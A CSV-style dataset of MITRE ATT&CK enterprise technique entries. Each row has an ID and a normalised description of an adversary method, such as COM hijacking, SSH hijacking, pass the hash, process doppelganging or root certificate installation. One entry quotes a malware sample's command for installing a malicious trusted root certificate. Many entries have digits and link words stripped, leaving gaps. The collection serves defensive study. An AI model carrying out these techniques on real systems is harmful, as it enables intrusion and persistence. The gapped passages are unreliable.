attack-pattern--baf60e1a-afe5-4d31-830f-1b1ba2351884,['enterprise-attack'],['T1592.002'],Software,adversaries may gather information about the victim's host software that can be used during targeting  information about installed software may include a variety of details such as types and versions on specific hosts  as well as the presence of additional components that might be indicative of added defensive protections  ex  antivirus  siems  etc_ _  adversaries may gather this information in various ways  such as direct collection actions via  active   ex  listening ports  server banners  user agent strings  or  phishing for  adversaries may also compromise sites then include malicious content designed to collect host information from visitors_ citation  att scanbox  information about the installed software may also be exposed to adversaries via online or other accessible data sets  ex  job postings  network maps  assessment reports  resumes  or purchase invoices   gathering this information may reveal opportunities for other forms of reconnaissance  ex   search open  or  search open technical  establishing operational resources  ex   develop  or  obtain  and or for initial access  ex   supply chain  or  external remote
attack-pattern--bb0e0cb5-f3e4-4118-a4cb-6bf13bfbc9f2,['enterprise-attack'],['T1128'],Netsh Helper DLL,netsh_exe  also referred to as netshell  is a command line scripting utility used to interact with the network configuration of a system  it contains functionality to add helper dlls for extending functionality of the utility   citation  technet netsh  the paths to registered netsh_exe helper dlls are entered into the windows registry at hklm software microsoft netsh_  adversaries can use netsh_exe with helper dlls to proxy execution of arbitrary code in a persistent manner when netsh_exe is executed automatically with another persistence technique or if other persistent software is present on the system that executes netsh_exe as part of its normal functionality  examples include some vpn software that invoke netsh_exe   citation  demaske netsh persistence   proof of concept code exists to load cobalt strike's payload using netsh_exe helper dlls   citation  github netsh helper cs beacon 
attack-pattern--bb5a00de-e086-4859-a231-fa793f6797e2,['enterprise-attack'],['T1056'],Input Capture,adversaries may use methods of capturing user input to obtain credentials or collect information  during normal system usage  users often provide credentials to various different locations  such as login pages portals or system dialog boxes  input capture mechanisms may be transparent to the user  e_g   credential api  or rely on deceiving the user into providing input into what they believe to be a genuine service  e_g   web portal
attack-pattern--bbc3cba7-84ae-410d-b18b-16750731dfa2,['enterprise-attack'],['T1587.004'],Exploits,adversaries may develop exploits that can be used during targeting  an exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software  rather than finding modifying exploits from online or purchasing them from exploit vendors  an adversary may develop their own exploits  adversaries may use information acquired via  to focus exploit development efforts  as part of the exploit development process  adversaries may uncover exploitable vulnerabilities through methods such as fuzzing and patch analysis_ citation  irongeek sims bsides        as with legitimate development efforts  different skill sets may be required for developing exploits  the skills needed may be located in house  or may need to be contracted out  use of a contractor may be considered an extension of that adversary's exploit development capabilities  provided the adversary plays a role in shaping requirements and maintains an initial degree of exclusivity to the exploit_  adversaries may use exploits during various phases of the adversary lifecycle  i_e   exploit public facing   exploitation for client   exploitation for privilege   exploitation for defense   exploitation for credential   exploitation of remote  and  application or system
attack-pattern--bbe5b322-e2af-4a5e-9625-a4e62bf84ed3,['enterprise-attack'],['T1593.001'],Social Media,adversaries may search social media for information about victims that can be used during targeting  social media sites may contain various information about a victim organization  such as business announcements as well as information about the roles  locations  and interests of staff_  adversaries may search in different social media sites depending on what information they seek to gather  threat actors may passively harvest data from these sites  as well as use information gathered to create fake profiles groups to elicit victim s into revealing specific information  i_e   spearphishing  cyware social media  information from these sources may reveal opportunities for other forms of reconnaissance  ex   phishing for  or  search open technical  establishing operational resources  ex   establish  or  compromise  and or initial access  ex   spearphishing via
attack-pattern--bc0f5e80-91c0-4e04-9fbb-e4e332c85dae,['enterprise-attack'],['T1546.015'],Component Object Model Hijacking,adversaries may establish persistence by executing malicious content triggered by hijacked references to component object model  com  objects  com is a system within windows to enable interaction between software components through the operating system_ citation  microsoft component object model   references to various com objects are stored in the registry    adversaries can use the com system to insert malicious code that can be executed in place of legitimate software through hijacking the com references and relationships as a means for persistence  hijacking a com object requires a change in the registry to replace a reference to a legitimate system component which may cause that component to not work when executed  when that system component is executed through normal system operation the adversary's code will be executed instead_ citation  gdata com hijacking  an adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence  but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection 
attack-pattern--bc76d0a4-db11-4551-9ac4-01a469cfb161,['enterprise-attack'],['T1589.001'],Credentials,adversaries may gather credentials that can be used during targeting  account credentials gathered by adversaries may be those directly associated with the target victim organization or attempt to take advantage of the tendency for users to use the same passwords across personal and business accounts_  adversaries may gather credentials from potential victims in various ways  such as direct elicitation via  phishing for  adversaries may also compromise sites then include malicious content designed to collect website authentication cookies from visitors_ citation  att scanbox  credential information may also be exposed to adversaries via leaks to online or other accessible data sets  ex   search  breach dumps  code repositories  etc_ _ citation  register deloitte  citation  register uber  citation  detectify slack tokens  citation  forbes github creds  citation  github trufflehog  citation  github gitrob  citation  cnet leaks  adversaries may also purchase credentials from dark web or other black markets  gathering this information may reveal opportunities for other forms of reconnaissance  ex   search open  or  phishing for  establishing operational resources  ex   compromise  and or initial access  ex   external remote  or  valid
attack-pattern--bd369cd9-abb8-41ce-b5bb-fff23ee86c00,['enterprise-attack'],['T1195.002'],Compromise Software Supply Chain,adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise  supply chain compromise of software can take place in a number of ways  including manipulation of the application source code  manipulation of the update distribution mechanism for that software  or replacing compiled releases with a modified version_  targeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims_ citation  avast ccleaner        citation  command five sk      
attack-pattern--bd5b58a4-a52d-4a29-bc0d-3f1d3968eb6b,['enterprise-attack'],['T1036.003'],Rename System Utilities,adversaries may rename legitimate system utilities to try to evade security mechanisms concerning the usage of those utilities  security monitoring and control mechanisms may be in place for system utilities adversaries are capable of abusing   citation  lolbas main site  it may be possible to bypass those security mechanisms by renaming the utility prior to utilization  ex  rename rundll  _exe    citation  elastic masquerade ball  an alternative case occurs when a legitimate utility is copied or moved to a different directory and renamed to avoid detections based on system utilities executing from non standard paths   citation  f secure cozyduke 
attack-pattern--be055942-6e63-49d7-9fa1-9cb7d8a8f3f4,['enterprise-attack'],['T1102.002'],Bidirectional Communication,adversaries may use an existing  legitimate external web service as a means for sending commands to and receiving output from a compromised system over the web service channel  compromised systems may leverage popular websites and social media to host command and control  c   instructions  those infected systems can then send the output from those commands back over that web service channel  the return traffic may occur in a variety of ways  depending on the web service being utilized  for example  the return traffic may take the form of the compromised system posting a comment on a forum  issuing a pull request to development project  updating a document hosted on a web service  or by sending a tweet    popular websites and social media acting as a mechanism for c  may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise  using common services  such as those offered by google or twitter  makes it easier for adversaries to hide in expected noise  web service providers commonly use ssl tls encryption  giving adversaries an added level of protection 
attack-pattern--be2dcee9-a7a7-4e38-afd6-21b31ecc3d63,['enterprise-attack'],['T1203'],Exploitation for Client Execution,adversaries may exploit software vulnerabilities in client applications to execute code  vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior  adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution  oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system  users will expect to see files related to the applications they commonly used to do work  so they are a useful target for exploit research and development because of their high utility_  several types exist       browser based exploitation  web browsers are a common target through  drive by  and  spearphishing  endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser  these often do not require an action by the user for the exploit to be executed_      office applications  common office and productivity applications such as microsoft office are also targeted through  malicious files will be transmitted directly as attachments or through links to download them  these require the user to open the document or file for the exploit to run_      common third party applications  other applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation  applications such as adobe reader and flash  which are common in enterprise environments  have been routinely targeted by adversaries attempting to gain access to systems  depending on the software and nature of the vulnerability  some may be exploited in the browser or require the user to open a file  for instance  some flash exploits have been delivered as objects within microsoft office documents 
attack-pattern--bed04f7d-e48a-4e76-bd0f-4c57fe31fc46,['enterprise-attack'],['T1595.003'],Wordlist Scanning,adversaries may iteratively probe infrastructure using brute forcing and crawling techniques  while this technique employs similar methods to  brute  its goal is the identification of content and infrastructure rather than the discovery of valid credentials  wordlists used in these scans may contain generic  commonly used names and file extensions or terms specific to a particular software  adversaries may also create custom  target specific wordlists using data gathered from other reconnaissance techniques  ex   gather victim org  or  search victim owned   for example  adversaries may use web content discovery tools such as dirb  dirbuster  and gobuster and generic or custom wordlists to enumerate a website s pages and directories_ citation  clearsky lebanese cedar jan       this can help them to discover old  vulnerable pages or hidden administrative portals that could become the target of further operations  ex   exploit public facing  or  brute     as cloud storage solutions typically use globally unique names  adversaries may also use target specific wordlists and tools such as s recon and gcpbucketbrute to enumerate public and private buckets on cloud infrastructure_ citation  s recon github  once storage objects are discovered  adversaries may leverage  data from cloud  to access valuable information that can be exfiltrated or used to escalate privileges and move laterally 
attack-pattern--bf147104-abf9-4221-95d1-e81585859441,['enterprise-attack'],['T1137.004'],Outlook Home Page,adversaries may abuse microsoft outlook's home page feature to obtain persistence on a compromised system  outlook home page is a legacy feature used to customize the presentation of outlook folders  this feature allows for an internal or external url to be loaded and presented whenever a folder is opened  a malicious html page can be crafted that will execute code when loaded by outlook home page_ citation  sensepost outlook home page   once malicious home pages have been added to the user s mailbox  they will be loaded when outlook is started  malicious home pages will execute when the right outlook folder is loaded reloaded_ citation  sensepost outlook home page 
attack-pattern--bf176076-b789-408e-8cba-7275e81c0ada,['enterprise-attack'],['T1573.002'],Asymmetric Cryptography,adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol  asymmetric cryptography  also known as public key cryptography  uses a keypair per party  one public that can be freely distributed  and one private  due to how the keys are generated  the sender encrypts data with the receiver s public key and the receiver decrypts the data with their private key  this ensures that only the intended recipient can read the encrypted data  common public key encryption algorithms include rsa and elgamal_  for efficiency  many protocols  including ssl tls  use symmetric cryptography once a connection is established  but use asymmetric cryptography to establish or transmit a key  as such  these protocols are classified as  asymmetric
attack-pattern--bf1b6176-597c-4600-bfcd-ac989670f96b,['enterprise-attack'],['T1567.002'],Exfiltration to Cloud Storage,adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel  cloud storage services allow for the storage  edit  and retrieval of data from a remote cloud storage server over the internet_  examples of cloud storage services include dropbox and google docs  exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service 
attack-pattern--bf90d72c-c00b-45e3-b3aa-68560560d4c5,['enterprise-attack'],['T1570'],Lateral Tool Transfer,adversaries may transfer tools or other files between systems in a compromised environment  once brought into the victim environment  i_e   ingress tool  files may then be copied from one system to another to stage adversary tools or other files over the course of an operation  adversaries may copy files between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over  smb windows admin  to connected network shares or with authenticated connections via  remote desktop  unit   lockergoga        files can also be transferred using native or otherwise present tools on the victim system  such as scp  rsync  curl  sftp  and
attack-pattern--bf96a5a3-3bce-43b7-8597-88545984c07b,['enterprise-attack'],['T1574.009'],Path Interception by Unquoted Path,adversaries may execute their own malicious payloads by hijacking vulnerable file path references  adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path  so that windows will choose the adversary's executable to launch_  service paths  citation  microsoft currentcontrolset services  and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks  e_g_  c  unsafe path with space program_exe vs   c  safe path with space program_exe     citation  help eliminate unquoted path   stored in windows registry keys  an adversary can place an executable in a higher level directory of the path  and windows will resolve that executable instead of the intended executable  for example  if the path in a shortcut is c  program files myapp_exe  an adversary may create a program at c  program_exe that will be run instead of the intended program   citation  windows unquoted services   citation  windows privilege escalation guide   this technique can be used for persistence if executables are called on a regular basis  as well as privilege escalation if intercepted executables are started by a higher privileged process 
attack-pattern--c071d8c1-3b3a-4f22-9407-ca4e96921069,['enterprise-attack'],['T1608.003'],Install Digital Certificate,adversaries may install ssl tls certificates that can be used during targeting  ssl tls certificates are files that can be installed on servers to enable secure communications between systems  digital certificates include information about the key  information about its owner's identity  and the digital signature of an entity that has verified the certificate's contents are correct  if the signature is valid  and the person examining the certificate trusts the signer  then they know they can use that key to communicate securely with its owner  certificates can be uploaded to a server  then the server can be configured to use the certificate to enable encrypted communication with it_ citation  digicert install ssl cert   adversaries may install ssl tls certificates that can be used to further their operations  such as encrypting c  traffic  ex   asymmetric  with  web  or lending credibility to a credential harvesting site  installation of digital certificates may take place for a number of server types  including web servers and email servers    adversaries can obtain digital certificates  see  digital  or create self signed certificates  see  digital  digital certificates can then be installed on adversary controlled infrastructure that may have been acquired   acquire  or previously compromised   compromise
attack-pattern--c0a384a4-9a25-40e1-97b6-458388474bc8,['enterprise-attack'],['T1168'],Local Job Scheduling,on linux and macos systems  multiple methods are supported for creating pre scheduled and periodic background jobs  cron   citation  die_net linux crontab man page  at   citation  die_net linux at man page  and launchd   citation  appledocs scheduling timed jobs  unlike  scheduled  on windows systems  job scheduling on linux based systems cannot be done remotely unless used in conjunction within an established remote session  like secure shell  ssh _      cron  system wide cron jobs are installed by modifying  etc crontab file   etc cron_d  directory or other locations supported by the cron daemon  while per user cron jobs are installed using crontab with specifically formatted crontab files   citation  appledocs scheduling timed jobs  this works on macos and linux systems_  those methods allow for commands or scripts to be executed at specific  periodic intervals in the background without user interaction  an adversary may use job scheduling to execute programs at system startup or on a scheduled basis for persistence    citation  methods of mac malware persistence   citation  malware persistence on os x   citation  avast linux trojan cron persistence  to conduct execution as part of lateral movement  to gain root privileges  or to run a process under the context of a specific account_      at  the at program is another means on posix based systems  including macos and linux  to schedule a program or script job for execution at a later date and or time  which could also be used for the same purposes_      launchd  each launchd job is described by a different configuration property list  plist  file similar to  launch  or  launch  except there is an additional key called startcalendarinterval with a dictionary of time values   citation  appledocs scheduling timed jobs  this only works on macos and os x 
attack-pattern--c0df6533-30ee-4a4a-9c6d-17af5abdf0b2,['enterprise-attack'],['T1166'],Setuid and Setgid,when the setuid or setgid bits are set on linux or macos for an application  this means that the application will run with the privileges of the owning user or group respectively   citation  setuid man page   normally an application is run in the current user s context  regardless of which user or group owns the application  there are instances where programs need to be executed in an elevated context to function properly  but the user running them doesn t need the elevated privileges  instead of creating an entry in the sudoers file  which must be done by root  any user can specify the setuid or setgid flag to be set for their own applications  these bits are indicated with an  s  instead of an  x  when viewing a file's attributes via ls  l  the chmod program can set these bits with via bitmasking  chmod       file  or via shorthand naming  chmod u s  file _  an adversary can take advantage of this to either do a shell escape or exploit a vulnerability in an application with the setsuid or setgid bits to get code running in a different user s context  additionally  adversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future   citation  osx keydnap malware  
attack-pattern--c0dfe7b0-b873-4618-9ff8-53e31f70907f,['enterprise-attack'],['T1037.005'],Startup Items,adversaries may use startup items automatically executed at boot initialization to establish persistence  startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items_ citation  startup items   this is technically a deprecated technology  superseded by  launch  and thus the appropriate folder   library startupitems isn t guaranteed to exist on the system by default  but does appear to exist by default on macos sierra  a startup item is a directory whose executable and configuration property list  plist   startupparameters_plist  reside in the top level directory    an adversary can create the appropriate folders files in the startupitems directory to register their own persistence mechanism_ citation  methods of mac malware persistence  additionally  since startupitems run during the bootup phase of macos  they will run as the elevated root user 
attack-pattern--c16e5409-ee53-4d79-afdc-4099dc9292df,['enterprise-attack'],['T1100'],Web Shell,a web shell is a web script that is placed on an openly accessible web server to allow an adversary to use the web server as a gateway into a network  a web shell may provide a set of functions to execute or a command line interface on the system that hosts the web server  in addition to a server side script  a web shell may have a client interface program that is used to talk to the web server  see  for example  china chopper web shell client    citation  lee        web shells may serve as  redundant  or as a persistence mechanism in case an adversary's primary access methods are detected and removed 
attack-pattern--c1a452f3-6499-4c12-b7e9-a6a0a102af76,['enterprise-attack'],['T1186'],Process Doppelgnging,windows transactional ntfs  txf  was introduced in vista as a method to perform safe file operations   citation  microsoft txf  to ensure data integrity  txf enables only one transacted handle to write to a file at a given time  until the write handle transaction is terminated  all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened   citation  microsoft basic txf concepts  to avoid corruption  txf performs an automatic rollback if the system or application fails during a write transaction   citation  microsoft where to use txf   although deprecated  the txf application programming interface  api  is still enabled as of windows      citation  blackhat process doppelg nging dec        adversaries may leverage txf to a perform a file less variation of  process  called process doppelg nging  similar to  process  process doppelg nging involves replacing the memory of a legitimate process  enabling the veiled execution of malicious code that may evade defenses and detection  process doppelg nging's use of txf also avoids the use of highly monitored api functions such as ntunmapviewofsection  virtualprotectex  and setthreadcontext   citation  blackhat process doppelg nging dec        process doppelg nging is implemented in   steps  citation  blackhat process doppelg nging dec           transact   create a txf transaction using a legitimate executable then overwrite the file with malicious code  these changes will be isolated and only visible within the context of the transaction_   load   create a shared section of memory and load the malicious executable_   rollback   undo changes to original executable  effectively removing malicious code from the file system_   animate   create a process from the tainted section of memory and initiate execution 
attack-pattern--c1b11bf7-c68e-4fbf-a95b-28efbe7953bb,['enterprise-attack'],['T1184'],SSH Hijacking,secure shell  ssh  is a standard means of remote access on linux and macos systems  it allows a user to connect to another system via an encrypted tunnel  commonly authenticating through a password  certificate or the use of an asymmetric encryption key pair_  in order to move laterally from a compromised host  adversaries may take advantage of trust relationships established with other systems via public key authentication in active ssh sessions by hijacking an existing connection to another system  this may occur through compromising the ssh agent itself or by having access to the agent's socket  if an adversary is able to obtain root access  then hijacking ssh sessions is likely trivial   citation  slideshare abusing ssh   citation  sshjack blackhat   citation  clockwork ssh agent hijacking  compromising the ssh agent also provides access to intercept ssh credentials   citation  welivesecurity ebury ssh    ssh  differs from use of  remote  because it injects into an existing ssh session rather than creating a new session using  valid
attack-pattern--c1b68a96-3c48-49ea-a6c0-9b27359f9c19,['enterprise-attack'],['T1614.001'],System Language Discovery,adversaries may attempt to gather information about the system language of a victim in order to infer the geographical location of that host  this information may be used to shape follow on behaviors  including whether the adversary infects the target and or attempts specific actions  this decision may be employed by malware developers and operators to reduce their risk of attracting the attention of specific law enforcement agencies or prosecution scrutiny from other entities_ citation  malware system language check   there are various sources of data an adversary could use to infer system language  such as system defaults and keyboard layouts  specific checks will vary based on the target and or adversary  but may involve behaviors such as  query  and calls to  native  functions_ citation  crowdstrike ryuk january         for example  on a windows system adversaries may attempt to infer the language of a system by querying the registry key hkey_local_machine system currentcontrolset control nls language or parsing the outputs of windows api functions getuserdefaultuilanguage  getsystemdefaultuilanguage  getkeyboardlayoutlist and getuserdefaultlangid_ citation  darkside ransomware cybereason  citation  securelist jsworm  citation  securelist synack doppelg nging may        on a macos or linux system  adversaries may query locale to retrieve the value of the  lang environment variable 
attack-pattern--c21d5a77-d422-4a69-acd7-2c53c1faa34b,['enterprise-attack'],['T1095'],Non-Application Layer Protocol,adversaries may use a non application layer protocol for communication between host and c  server or among infected hosts within a network  the list of possible protocols is extensive_ citation  wikipedia osi  specific examples include use of network layer protocols  such as the internet control message protocol  icmp   transport layer protocols  such as the user datagram protocol  udp   session layer protocols  such as socket secure  socks   as well as redirected tunneled protocols  such as serial over lan  sol _  icmp communication between hosts is one example_ citation  cisco synful knock evolution  because icmp is part of the internet protocol suite  it is required to be implemented by all ip compatible hosts_ citation  microsoft icmp  however  it is not as commonly monitored as other internet protocols such as tcp or udp and may be used by adversaries to hide communications 
attack-pattern--c23b740b-a42b-47a1-aec2-9d48ddd547ff,['enterprise-attack'],['T1075'],Pass the Hash,pass the hash  pth  is a method of authenticating as a user without having access to the user's cleartext password  this method bypasses standard authentication steps that require a cleartext password  moving directly into the portion of the authentication that uses the password hash  in this technique  valid password hashes for the account being used are captured using a credential access technique  captured hashes are used with pth to authenticate as that user  once authenticated  pth may be used to perform actions on local or remote systems    windows   and higher with kb        require valid domain user credentials or rid     administrator hashes   citation  nsa spotting 
attack-pattern--c2e147a9-d1a8-4074-811a-d8789202d916,['enterprise-attack'],['T1027.003'],Steganography,adversaries may use steganography techniques in order to prevent the detection of hidden information  steganographic techniques can be used to hide data in digital media such as images  audio tracks  video clips  or text files_   was an early example of malware that used steganography  it encrypted the gathered information from a victim's system and hid it within an image before exfiltrating the image to a c  server_ citation  wikipedia duqu    by the end of       a threat group used invoke psimage to hide  commands in an image file  _png  and execute the code on a victim's system  in this particular case the  code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary_ citation  mcafee malicious doc targets pyeongchang olympics 
attack-pattern--c2f59d25-87fe-44aa-8f83-e8e59d077bf5,['enterprise-attack'],['T1584.002'],DNS Server,adversaries may compromise third party dns servers that can be used during targeting  during post compromise activity  adversaries may utilize dns traffic for various tasks  including for command and control  ex   application layer  instead of setting up their own dns servers  adversaries may compromise third party dns servers in support of operations_  by compromising dns servers  adversaries can alter dns records  such control can allow for redirection of an organization's traffic  facilitating collection and credential access efforts for the adversary_ citation  talos dnspionage nov       citation  fireeye dns hijack        additionally  adversaries may leverage such control in conjunction with  digital  to redirect traffic to adversary controlled infrastructure  mimicking normal trusted network communications_ citation  fireeye dns hijack       citation  crowdstrike dns hijack       adversaries may also be able to silently create subdomains pointed at malicious servers without tipping off the actual owner of the dns server_ citation  proofpoint domain shadowing 
attack-pattern--c325b232-d5bc-4dde-a3ec-71f3db9e8adc,['enterprise-attack'],['T1001.003'],Protocol Impersonation,adversaries may impersonate legitimate protocols or web service traffic to disguise command and control activity and thwart analysis efforts  by impersonating legitimate protocols or web services  adversaries can make their command and control traffic blend in with legitimate network traffic     adversaries may impersonate a fake ssl tls handshake to make it look like subsequent traffic is ssl tls encrypted  potentially interfering with some security tooling  or to make the traffic look like it is related with a trusted entity 
attack-pattern--c32f7008-9fea-41f7-8366-5eb9b74bd896,['enterprise-attack'],['T1012'],Query Registry,adversaries may interact with the windows registry to gather information about the system  configuration  and installed software_  the registry contains a significant amount of information about the operating system  configuration  software  and security_ citation  wikipedia windows registry  information can easily be queried using the  utility  though other means to access the registry exist  some of the information may help adversaries to further their operation within a network  adversaries may use the information from  query  during automated discovery to shape follow on behaviors  including whether or not the adversary fully infects the target and or attempts specific actions 
attack-pattern--c3888c54-775d-4b2f-b759-75a2ececcbfd,['enterprise-attack'],['T1030'],Data Transfer Size Limits,an adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds  this approach may be used to avoid triggering network data transfer threshold alerts 
attack-pattern--c3bce4f4-9795-46c6-976e-8676300bbc39,['enterprise-attack'],['T1028'],Windows Remote Management,windows remote management  winrm  is the name of both a windows service and a protocol that allows a user to interact with a remote system  e_g_  run an executable  modify the registry  modify services    citation  microsoft winrm  it may be called with the winrm command or by any number of programs such as powershell   citation  jacobsen      
attack-pattern--c3c8c916-2f3c-4e71-94b2-240bdfc996f0,['enterprise-attack'],['T1550.004'],Web Session Cookie,adversaries can use stolen session cookies to authenticate to web applications and services  this technique bypasses some multi factor authentication protocols since the session is already authenticated_ citation  pass the cookie   authentication cookies are commonly used in web applications  including cloud based services  after a user has authenticated to the service so credentials are not passed and re authentication does not need to occur as frequently  cookies are often valid for an extended period of time  even if the web application is not actively used  after the cookie is obtained through  steal web session  or  web  the adversary may then import the cookie into a browser they control and is then able to use the site or application as the user for as long as the session cookie is active  once logged into the site  an adversary can access sensitive information  read email  or perform actions that the victim account has permissions to perform_  there have been examples of malware targeting session cookies to bypass multi factor authentication systems_ citation  unit    mac crypto cookies january      
attack-pattern--c3d4bdd9-2cfe-4a80-9d0c-07a29ecdce8f,['enterprise-attack'],['T1078.002'],Domain Accounts,adversaries may obtain and abuse credentials of a domain account as a means of gaining initial access  persistence  privilege escalation  or defense evasion_ citation  technet credential theft  domain accounts are those managed by active directory domain services where access and permissions are configured across systems and services that are part of that domain  domain accounts can cover users  administrators  and services_ citation  microsoft ad accounts   adversaries may compromise domain accounts  some with a high level of privileges  through various means such as  os credential  or password reuse  allowing access to privileged resources of the domain 
attack-pattern--c48a67ee-b657-45c1-91bf-6cdbe27205f8,['enterprise-attack'],['T1218.009'],Regsvcs/Regasm,adversaries may abuse regsvcs and regasm to proxy execution of code through a trusted windows utility  regsvcs and regasm are windows command line utilities that are used to register _net  component object   com  assemblies  both are binaries that may be digitally signed by microsoft   citation  msdn regsvcs   citation  msdn regasm   both utilities may be used to bypass application control through use of attributes within the binary to specify code that should be run before registration or unregistration   comregisterfunction  or  comunregisterfunction  respectively  the code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute   citation  lolbas regsvcs  citation  lolbas regasm 
attack-pattern--c4ad009b-6e13-4419-8d21-918a1652de02,['enterprise-attack'],['T1034'],Path Interception,  this technique has been deprecated  please use  path interception by path environment   path interception by search order  and or  path interception by unquoted   path interception occurs when an executable is placed in a specific path so that it is executed by an application instead of the intended target  one example of this was the use of a copy of  in the current working directory of a vulnerable application that loads a cmd or bat file with the createprocess function   citation  technet ms         there are multiple distinct weaknesses or misconfigurations that adversaries may take advantage of when performing path interception  unquoted paths  path environment variable misconfigurations  and search order hijacking  the first vulnerability deals with full program paths  while the second and third occur when program paths are not specified  these techniques can be used for persistence if executables are called on a regular basis  as well as privilege escalation if intercepted executables are started by a higher privileged process_      unquoted paths service paths  stored in windows registry keys   citation  microsoft subkey  and shortcut paths are vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks  e_g_  c  unsafe path with space program_exe vs   c  safe path with space program_exe     citation  baggett       an adversary can place an executable in a higher level directory of the path  and windows will resolve that executable instead of the intended executable  for example  if the path in a shortcut is c  program files myapp_exe  an adversary may create a program at c  program_exe that will be run instead of the intended program   citation  securityboulevard unquoted services apr        citation  sploitspren windows priv jan            path environment variable misconfiguration the path environment variable contains a list of directories  certain methods of executing a program  namely using cmd_exe or the command line  rely solely on the path environment variable to determine the locations that are searched for a program when the path for the program is not given  if any directories are listed in the path environment variable before the windows directory   systemroot  system    e_g_  c  windows system     a program may be placed in the preceding directory that is named the same as a windows program  such as cmd  powershell  or python   which will be executed when that command is executed from a script or command line_  for example  if c  example path precedes c  windows system   is in the path environment variable  a program that is named net_exe and placed in c  example path will be called instead of the windows system  net  when  net  is executed from the command line_      search order hijacking search order hijacking occurs when an adversary abuses the order in which windows searches for programs that are not given a path  the search order differs depending on the method that is used to execute the program   citation  microsoft createprocess   citation  hill nt shell   citation  microsoft winexec  however  it is common for windows to search in the directory of the initiating program before searching through the windows system directory  an adversary who finds a program vulnerable to search order hijacking  i_e_  a program that does not specify the path to an executable  may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory_  for example   example_exe  runs  cmd_exe  with the command line argument net user  an adversary may place a program called  net_exe  within the same directory as example_exe   net_exe  will be run instead of the windows system utility net  in addition  if an adversary places a program called  net_com  in the same directory as  net_exe   then cmd_exe  c net user will execute  net_com  instead of  net_exe  due to the order of executable extensions defined under pathext   citation  msdn environment property   search order hijacking is also a common practice for hijacking dll loads and is covered in  dll search order
attack-pattern--c5e31fb5-fcbd-48a4-af8c-5a6ed5b932e5,['enterprise-attack'],['T1506'],Web Session Cookie,adversaries can use stolen session cookies to authenticate to web applications and services  this technique bypasses some multi factor authentication protocols since the session is already authenticated_ citation  pass the cookie   authentication cookies are commonly used in web applications  including cloud based services  after a user has authenticated to the service so credentials are not passed and re authentication does not need to occur as frequently  cookies are often valid for an extended period of time  even if the web application is not actively used  after the cookie is obtained through  steal web session  the adversary then imports the cookie into a browser they control and is able to use the site or application as the user for as long as the session cookie is active  once logged into the site  an adversary can access sensitive information  read email  or perform actions that the victim account has permissions to perform_  there have been examples of malware targeting session cookies to bypass multi factor authentication systems_ citation  unit    mac crypto cookies january      
attack-pattern--c615231b-f253-4f58-9d47-d5b4cbdb6839,['enterprise-attack'],['T1553.004'],Install Root Certificate,adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers  root certificates are used in public key cryptography to identify a root certificate authority  ca   when a root certificate is installed  the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate_ citation  wikipedia root certificate  certificates are commonly used for establishing secure tls ssl communications within a web browser  when a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk  depending on the security settings  the browser may not allow the user to establish a connection to the website_  installation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system  adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over https to adversary controlled web servers that spoof legitimate websites in order to collect login credentials_ citation  operation emmental   atypical root certificates have also been pre installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware adware to provide  capability for intercepting information transmitted over secure tls ssl communications_ citation  kaspersky superfish   root certificates  and their associated chains  can also be cloned and reinstalled  cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools  ex  sysinternals  antivirus  etc_  used to block execution and or uncover artifacts of persistence_ citation  spectorops code signing dec        in macos  the ay mami malware uses  usr bin security add trusted cert  d  r trustroot  k  library keychains system_keychain  path to malicious cert to install a malicious certificate as a trusted root certificate into the system keychain_ citation  objective see ay mami      
attack-pattern--c63a348e-ffc2-486a-b9d9-d7f11ec54d99,['enterprise-attack'],['T1037.003'],Network Logon Script,adversaries may use network logon scripts automatically executed at logon initialization to establish persistence  network logon scripts can be assigned using active directory or group policy objects_ citation  petri logon script ad  these logon scripts run with the privileges of the user they are assigned to  depending on the systems within the network  initializing one of these scripts could apply to more than one or potentially all systems      adversaries may use these scripts to maintain persistence on a network  depending on the access configuration of the logon scripts  either local credentials or an administrator account may be necessary 
